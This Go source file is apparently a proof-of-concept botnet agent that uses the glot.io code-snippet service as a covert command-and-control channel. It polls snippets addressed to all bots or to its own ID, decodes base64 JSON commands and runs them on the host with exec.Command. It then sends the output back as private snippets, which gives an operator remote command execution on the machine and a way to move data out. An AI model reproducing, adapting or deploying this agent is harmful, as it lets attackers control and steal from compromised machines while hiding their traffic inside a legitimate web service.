package main

import (
	"net/http"
	"io/ioutil"
	"fmt"
	"time"
	"encoding/json"
	"strings"
	"encoding/base64"
	"os/exec"
	"bytes"
)

var (
	BotId = "abcdef-123456-098723"
	APIToken = "<your_token>"
	ReportAPIToken = "<your_token>"
	GlotEndpoint = "https://snippets.glot.io/snippets"
)

type ListSnippetRes []struct {
	URL       string `json:"url"`
	ID        string `json:"id"`
	Created   time.Time `json:"created"`
	Modified  time.Time `json:"modified"`
	Language  string `json:"language"`
	Title     string `json:"title"`
	Public    bool `json:"public"`
	Owner     string `json:"owner"`
	FilesHash string `json:"files_hash"`
}

type GetSnippetRes struct {
	ID        string `json:"id"`
	URL       string `json:"url"`
	Created   time.Time `json:"created"`
	Modified  time.Time `json:"modified"`
	FilesHash string `json:"files_hash"`
	Language  string `json:"language"`
	Title     string `json:"title"`
	Public    bool `json:"public"`
	Owner     string `json:"owner"`
	Files     []struct {
		Name    string `json:"name"`
		Content string `json:"content"`
	} `json:"files"`
}

type CreateSnippetReq struct {
	Language string `json:"language"`
	Title    string `json:"title"`
	Public   bool `json:"public"`
	Files    []SnippetFile `json:"files"`
}

type SnippetFile struct {
	Name    string `json:"name"`
	Content string `json:"content"`
}

type CommandRes struct {
	Cmd  string `json:"cmd"`
	Args string `json:"args"`
}

type ReportReq struct {
	SnippetID string `json:"snippet_id"`
	BotId     string `json:"bot_id"`
	CmdId     string `json:"cmd_id"`
	CmdResult []CommandResult `json:"cmd_result"`
}

type CommandResult struct {
	Request      string `json:"request"`
	ReturnResult string `json:"return_result"`
	ReturnCode   int `json:"return_code"`
	Error        string `json:"error"`
}

func main() {
	client := &http.Client{}
	req, _ := http.NewRequest("GET", GlotEndpoint, nil)
	req.Header.Set("Authorization", "Token " + APIToken)

	fmt.Printf("Bot ===> glot.io, Snippets request with auth token %s\n", APIToken)
	res, err := client.Do(req)

	if err != nil {
		panic(err)
	}

	snippets := ListSnippetRes{}
	resBody, _ := ioutil.ReadAll(res.Body)
	json.Unmarshal(resBody, &snippets)
	fmt.Println("Bot <=== glot.io, Got snippet list: ")
	fmt.Println(string(resBody));

	for _, snippet := range snippets {
		title := strings.Split(snippet.Title, ":")
		if strings.Compare(title[0], "ALL") == 0 || strings.Compare(title[0], BotId) == 0 {
			cmdId := title[1];

			req, _ = http.NewRequest("GET", snippet.URL, nil)
			fmt.Printf("Bot ===> glot.io, Request Snippet ID: %s, Snippet URL: %s\n", snippet.ID, snippet.URL)
			res, err = client.Do(req)

			if err != nil {
				panic(err)
			}

			cmdSnippet := GetSnippetRes{}
			resBody, _ = ioutil.ReadAll(res.Body)
			json.Unmarshal(resBody, &cmdSnippet)
			fmt.Println("Bot <=== glot.io, Got snippet")
			fmt.Println(string(resBody))

			reportReq := ReportReq{}
			reportReq.BotId = BotId
			reportReq.CmdId = cmdId
			reportReq.SnippetID = snippet.ID
			reportReq.CmdResult = []CommandResult{}

			cmdSnippetFiles := cmdSnippet.Files
			for _, file := range cmdSnippetFiles {
				data, err := base64.StdEncoding.DecodeString(file.Content)
				if err != nil {
					panic(err)
				}

				cmd := CommandRes{}
				err = json.Unmarshal(data, &cmd)

				if err != nil {
					panic(err)
				}

				var cmdArgs []string
				if len(cmd.Args) > 0 {
					cmdArgs = strings.Split(cmd.Args, " ");
				}

				var cmdOut []byte
				if cmdOut, err = exec.Command(cmd.Cmd, cmdArgs...).Output(); err != nil {
					fmt.Errorf("%s", err.Error())
					reportReq.CmdResult = append(reportReq.CmdResult, CommandResult{string(data), "", 1, err.Error()})
					continue;
				}

				reportReq.CmdResult = append(reportReq.CmdResult, CommandResult{string(data), string(cmdOut), 0, ""})
			}

			contentJson, _ := json.Marshal(reportReq)
			base64Content := base64.StdEncoding.EncodeToString(contentJson)

			createSnipReq := CreateSnippetReq{}
			createSnipReq.Public = false
			createSnipReq.Title = BotId + ":" + cmdId;
			createSnipReq.Language = "plaintext"
			createSnipReq.Files = append(createSnipReq.Files, SnippetFile{})
			createSnipReq.Files[0].Content = base64Content
			createSnipReq.Files[0].Name = "report.txt"

			reportReqJson, _ := json.Marshal(createSnipReq)

			fmt.Println("Bot ===> glot.io: Report")
			fmt.Println(string(reportReqJson))

			req, _ = http.NewRequest("POST", GlotEndpoint, bytes.NewBuffer(reportReqJson))
			req.Header.Set("Authorization", "Token " + ReportAPIToken)
			req.Header.Set("Content-Type", "application/json")

			_, err := client.Do(req)
			if err != nil {
				panic(err)
			}
		}
	}
}
